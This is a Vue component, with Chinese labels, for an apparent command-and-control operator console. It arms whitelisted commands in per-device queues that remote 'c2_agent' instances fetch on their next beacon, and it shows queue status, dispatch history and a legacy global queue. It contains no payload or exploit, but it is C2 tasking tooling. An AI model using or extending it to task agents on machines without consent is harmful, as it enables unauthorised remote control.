<script setup lang="ts">
import { computed, onMounted, ref, watch } from 'vue'
import { useCommandStore } from '@/stores/command'
import { useDashStore } from '@/stores/dash'
import { COMMAND_PARAM_HINT, COMMAND_TYPE_LABEL, type CommandType } from '@/api/types'
import type { DeviceQueueTarget as QueueTarget } from '@/api/query'
import EmptyState from '@/components/EmptyState.vue'
import JsonViewer from '@/components/JsonViewer.vue'
import { tsShort } from '@/utils/format'
import { ElMessage } from 'element-plus'

/**
 * 设备控制台：按设备独立队列的批量异步下发。
 *
 * 与老的单行全局队列的差别：
 *   老 —— 一条指令占住全局，任意设备领走才释放；一台不心跳 → 后面全堵。
 *   新 —— 每台设备一条 FIFO，各自领取；单台不在线不影响其它设备；可批量一次武装 N 台。
 */
const cmd = useCommandStore()
const dash = useDashStore()

const activeTarget = ref('')
const type = ref<CommandType>('basic_info')
const paramsText = ref(COMMAND_PARAM_HINT.basic_info)
const once = ref(true)

/** 目标候选：设备台账 IP（去重）+ 队列中已有 target */
const candidates = computed(() => {
  const set = new Set<string>()
  for (const d of dash.devices) if (d.ip) set.add(d.ip)
  for (const t of cmd.targets) if (t.target) set.add(String(t.target))
  return [...set]
})

/** 多选目标（批量） */
const selected = ref<string[]>([])

async function armSelected() {
  if (!selected.value.length) {
    ElMessage.warning('请选择目标设备')
    return
  }
  const n = await cmd.armBatch(selected.value, type.value, paramsText.value, once.value)
  if (n) await refresh()
}

async function armOne(target: string) {
  const ok = await cmd.arm(type.value, paramsText.value, once.value, target)
  if (ok) await refresh()
}

async function clearOne(target: string) {
  await cmd.clear(target)
  await refresh()
}

async function clearAll() {
  await cmd.clear()
  await refresh()
}

async function refresh() {
  await Promise.all([cmd.peek(), cmd.refreshTargets(), cmd.refreshHistory()])
  if (activeTarget.value) await cmd.refreshDetail(activeTarget.value)
}

watch(activeTarget, (t) => {
  if (t) void cmd.refreshDetail(t)
})

onMounted(() => {
  void refresh()
})

const stateChip = (s?: string) =>
  s === 'dispatched' ? 'chip--ok' : s === 'armed' ? 'chip--warn' : s === 'cancelled' ? '' : ''

/** 设备队列过滤（按设备 target 客户端过滤） */
const queueKw = ref('')
const filteredTargets = computed(() => {
  const k = queueKw.value.trim().toLowerCase()
  if (!k) return cmd.targets
  return cmd.targets.filter((t) => String(t.target ?? '').toLowerCase().includes(k))
})

/** 大列表优化（不改变交互控件）：
 *  - 队列表只渲染前 QUEUE_CAP 行（其余靠过滤收窄）
 *  - 明细表封顶
 *  - 目标候选下拉封顶（保持原生 el-select 交互，不换虚拟组件）
 */
const QUEUE_CAP = 120
const DETAIL_CAP = 200
const CAND_CAP = 300
const shownCandidates = computed(() => candidates.value.slice(0, CAND_CAP))
const shownTargets = computed(() => filteredTargets.value.slice(0, QUEUE_CAP))
const shownDetail = computed(() => cmd.detail.slice(0, DETAIL_CAP))
</script>

<template>
  <div class="dc">
    <!-- 能力提示 -->
    <el-alert v-if="cmd.perDevice === false" type="warning" :closable="false" show-icon>
      <template #title>当前后端不支持按设备独立队列</template>
      需要 Go 版（含 device_commands 表）。当前退化为全局单队列：任意一台领走即清，
      一台不心跳会阻塞后续指令。升级后端后此页自动切换为批量异步模式。
    </el-alert>

    <div class="grid two">
      <!-- 武装表单 -->
      <section class="app-card">
        <div class="app-card__head">
          <h3 class="app-card__title">
            <el-icon><Promotion /></el-icon>批量武装
            <span class="chip" :class="cmd.pendingTotal ? 'chip--warn' : ''">待发合计 {{ cmd.pendingTotal }}</span>
          </h3>
        </div>
        <div class="app-card__body">
          <el-form label-position="top" size="small">
            <el-form-item label="目标设备（可多选 · 每台独立队列）">
              <el-select v-model="selected" multiple filterable clearable collapse-tags collapse-tags-tooltip
                placeholder="选择设备 IP / uuid" style="width: 100%">
                <el-option v-for="c in shownCandidates" :key="c" :label="c" :value="c" />
              </el-select>
            </el-form-item>
            <el-form-item label="指令类型（白名单）">
              <el-select v-model="type" style="width: 100%"
                @change="(v: CommandType) => (paramsText = COMMAND_PARAM_HINT[v] || '{}')">
                <el-option v-for="t in cmd.types" :key="t" :label="COMMAND_TYPE_LABEL[t] || t" :value="t" />
              </el-select>
            </el-form-item>
            <el-form-item label="params（JSON）">
              <el-input v-model="paramsText" type="textarea" :rows="4" class="mono" />
            </el-form-item>
            <el-form-item>
              <el-checkbox v-model="once">once（单发即清）</el-checkbox>
            </el-form-item>
            <div class="row row--wrap">
              <el-button type="primary" :loading="cmd.busy" :disabled="!selected.length" @click="armSelected">
                批量武装{{ selected.length ? `（${selected.length}）` : '' }}
              </el-button>
              <el-button :loading="cmd.busy" @click="clearAll">清空全局队列</el-button>
              <el-button :loading="cmd.loading" @click="refresh">刷新</el-button>
            </div>
          </el-form>

          <el-alert type="info" :closable="false" class="note" show-icon>
            <template #title>分发机制</template>
            武装即返回（异步）。每台设备的指令由<strong>该设备自己的下一次 beacon</strong> 领走；
            前端不推送、也不调用回传端点。
            <code>exit</code> 不在列表内：会终止设备端 c2_agent 循环且不可恢复。
          </el-alert>
        </div>
      </section>

      <!-- 各设备队列 -->
      <section class="app-card">
        <div class="app-card__head">
          <h3 class="app-card__title">
            <el-icon><List /></el-icon>设备队列
            <span class="chip chip--warn">待发 {{ cmd.pendingTotal }}</span>
            <span class="chip chip--ok">已发 {{ cmd.dispatchedTotal }}</span>
          </h3>
          <el-input v-model="queueKw" size="small" clearable placeholder="过滤设备 IP / uuid" style="width: 200px" />
        </div>
        <div class="app-card__body app-card__body--flush">
          <el-table :data="shownTargets" size="small" height="330" empty-text="…"
            @row-click="(r: QueueTarget) => r.target && (activeTarget = String(r.target))">
            <el-table-column prop="target" label="设备" min-width="150">
              <template #default="{ row }"><span class="mono">{{ row.target }}</span></template>
            </el-table-column>
            <el-table-column prop="armed" label="待发" width="76" align="right">
              <template #default="{ row }"><b class="num s-warn">{{ row.armed }}</b></template>
            </el-table-column>
            <el-table-column prop="dispatched" label="已发" width="76" align="right">
              <template #default="{ row }"><span class="num s-ok">{{ row.dispatched }}</span></template>
            </el-table-column>
            <el-table-column prop="last_armed_ts" label="最后武装" width="160">
              <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.last_armed_ts) }}</span></template>
            </el-table-column>
            <el-table-column label="操作" width="150" fixed="right">
              <template #default="{ row }">
                <el-button link size="small" type="primary" @click.stop="armOne(row.target)">武装</el-button>
                <el-button link size="small" @click.stop="clearOne(row.target)">取消</el-button>
              </template>
            </el-table-column>
            <template #empty>
              <EmptyState v-if="cmd.perDevice === false" text="后端不支持按设备队列" />
              <span v-else class="muted">…</span>
            </template>
          </el-table>
          <div v-if="filteredTargets.length > QUEUE_CAP" class="dc-foot">
            仅渲染前 {{ QUEUE_CAP }} / 共 {{ filteredTargets.length }} 台 · 请用过滤缩小范围
          </div>
        </div>
      </section>
    </div>

    <!-- 单设备明细 -->
    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title">
          <el-icon><Document /></el-icon>队列明细
          <span v-if="activeTarget" class="chip chip--brand mono">{{ activeTarget }}</span>
        </h3>
        <el-select v-model="activeTarget" size="small" filterable clearable placeholder="选择设备查看明细"
          style="width: 260px">
          <el-option v-for="c in shownCandidates" :key="c" :label="c" :value="c" />
        </el-select>
      </div>
      <div class="app-card__body app-card__body--flush">
        <el-table :data="shownDetail" size="small" height="280" empty-text="…">
          <el-table-column prop="command_id" label="command_id" width="200">
            <template #default="{ row }"><span class="mono t-3">{{ row.command_id }}</span></template>
          </el-table-column>
          <el-table-column prop="cmd_type" label="类型" width="140">
            <template #default="{ row }"><span class="chip chip--brand">{{ row.cmd_type }}</span></template>
          </el-table-column>
          <el-table-column prop="state" label="状态" width="100">
            <template #default="{ row }">
              <span class="chip" :class="stateChip(row.state)">{{ row.state }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="once" label="once" width="70">
            <template #default="{ row }"><span class="mono t-3">{{ row.once ? '是' : '否' }}</span></template>
          </el-table-column>
          <el-table-column prop="armed_ts" label="武装时间" width="160">
            <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.armed_ts) }}</span></template>
          </el-table-column>
          <el-table-column prop="dispatched_ts" label="领取时间" width="160">
            <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.dispatched_ts) }}</span></template>
          </el-table-column>
          <el-table-column prop="client_ip" label="领取设备" width="140">
            <template #default="{ row }"><span class="mono">{{ row.client_ip || '-' }}</span></template>
          </el-table-column>
          <el-table-column label="params" min-width="160">
            <template #default="{ row }">
              <span class="mono t-3 ellipsis">{{ row.params ? JSON.stringify(row.params) : '-' }}</span>
            </template>
          </el-table-column>
          <template #empty><EmptyState inline /></template>
        </el-table>
      </div>
    </section>

    <!-- 全局队列（兼容通道） -->
    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title">
          <el-icon><InfoFilled /></el-icon>全局队列（兼容通道 · GET /__control）
        </h3>
      </div>
      <div class="app-card__body">
        <JsonViewer v-if="cmd.armed" :text="JSON.stringify(cmd.current ?? {}, null, 2)" max-height="220px" />
        <EmptyState v-else text="全局队列为空（noop）：不会向任何设备下发指令" />
      </div>
    </section>
  </div>
</template>

<style scoped>
.dc {
  display: flex;
  flex-direction: column;
  gap: var(--sp-4);
}
.two {
  grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
}
.note {
  margin-top: var(--sp-4);
  background: transparent;
  border: 1px solid var(--border);
}
.note code {
  font-family: var(--font-mono);
  font-size: var(--fs-xs);
  padding: 1px 5px;
  border-radius: var(--r-sm);
  background: var(--bg-hover);
}
:deep(.el-table__row) {
  cursor: pointer;
}
.dc-foot {
  padding: 6px 12px;
  font-size: var(--fs-xs);
  color: var(--text-3);
  border-top: 1px solid var(--border);
}
</style>
